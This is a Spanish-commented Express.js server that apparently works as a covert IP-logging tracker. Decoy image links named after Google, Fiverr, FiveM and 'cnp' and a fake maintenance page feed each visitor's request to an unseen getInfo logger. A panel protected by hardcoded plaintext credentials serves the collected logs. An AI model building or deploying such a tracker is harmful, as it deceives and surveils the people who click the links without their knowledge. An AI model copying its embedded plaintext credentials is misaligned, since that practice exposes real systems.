const express = require("express");
const app = express();
const path = require("path");
const fs = require("fs")
const getInfo = require('./modules/getInfo')
var data = path.join(__dirname, 'logs.txt');
var cnp = path.join(__dirname, '/src/imgs/cnp.png');
var google = path.join(__dirname, '/src/imgs/google.png');
var fiverr = path.join(__dirname, '/src/imgs/fiverr.png');
var fivem = path.join(__dirname, '/src/imgs/fivem.png');


// Variables de usuario y contraseña
const username = 'nicogarcia0';
const password = 'xTNsxKKK15cE';

// Middleware para procesar los datos del formulario
app.use(express.urlencoded({ extended: true }));

// Ruta para el formulario de inicio de sesión
app.get('/fcpanel', (req, res) => {
  res.send(`
    <h1>Iniciar sesión</h1>
    <form action="/fcpanel" method="POST">
      <label for="username">Nombre de usuario:</label>
      <input type="text" id="username" name="username" required><br><br>
      <label for="password">Contraseña:</label>
      <input type="password" id="password" name="password" required><br><br>
      <input type="submit" value="Iniciar sesión">
    </form>
  `);
});

// Ruta para procesar los datos del formulario de inicio de sesión
app.post('/fcpanel', (req, res) => {
  const enteredUsername = req.body.username;
  const enteredPassword = req.body.password;

  if (enteredUsername === username && enteredPassword === password) {
    res.sendFile(data);
  } else {
    res.send('Error.');
  }
});


// Listener para cualquier URL (Rastreadores)

app.use((req, res) => {
    let url = req.url
    switch(url) {
      case "/cnp":
        res.sendFile(cnp)
        break
      case "/fivem":
        res.sendFile(fivem)
        break
      case "/google":
        res.sendFile(google)
      case "/fiverr":
        res.sendFile(fiverr)
        break
      default:
        res.send("<h1 style='font-family: 'Segoe UI';'>Web en mantenimiento, lo sentimos. </h1>")
      }
    getInfo.main(url)
});

console.log("Starting logger...");
app.listen(80, () => {
    console.log("Escucha levantada en el puerto 80.");
});